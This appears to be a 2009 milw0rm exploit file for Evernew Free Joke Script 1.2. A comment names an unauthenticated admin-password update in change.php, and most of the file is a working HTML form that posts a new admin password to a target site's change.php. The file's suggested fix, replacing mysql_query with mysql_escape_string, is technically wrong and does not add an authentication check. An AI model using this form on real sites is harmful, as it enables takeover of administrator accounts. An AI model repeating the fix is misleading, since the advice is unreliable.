@@ -1,0 +1,38 @@
+<!--
+  Discovered & Exploited by : Hakxer
+  Evernew Free Joke Script 1.2 => Remote Change Password
+ 
+  [=>] Bug detail
+  bug in change.php file
+  in line 10 :
+  $result=mysql_query("update admin set password='$pass'");
+ -----------------------
+ 
+  [=>] Fix
+  $result=mysql_escape_string("update admin set password='$pass'");
+  change mysql_query to mysql_escape_string
+ 
+  [=>] Greetz : ExH , ProViDoR , Error code , dody2100 , sinaritx , all my friends
+!-->
+<form action="http://www.site.com/script/admin/change.php" method="post" name="form1" id="form1" onSubmit="MM_validateForm('password','','R');return document.MM_returnValue">
+<font class="text"><b>enter password to change it in admin :D</b></font> <br />
+<br/>
+<table width="305" height="106" border="0" cellpadding="5" cellspacing="0">
+<tr>
+<td width="103" class="text">Password : </td>
+<td width="182"><div align="left">
+<input name="password" type="password" class="style7" id="password" />
+</div></td>
+</tr>
+<tr>
+<td colspan="2"><div align="center">
+<input name="Submit" type="submit" class="text_1" value="Change Password" />
+</div></td>
+</tr>
+<tr>
+<td colspan="2"><?php echo($msg); ?> </td>
+</tr>
+</table>
+</form>
+
+# milw0rm.com [2009-06-15]
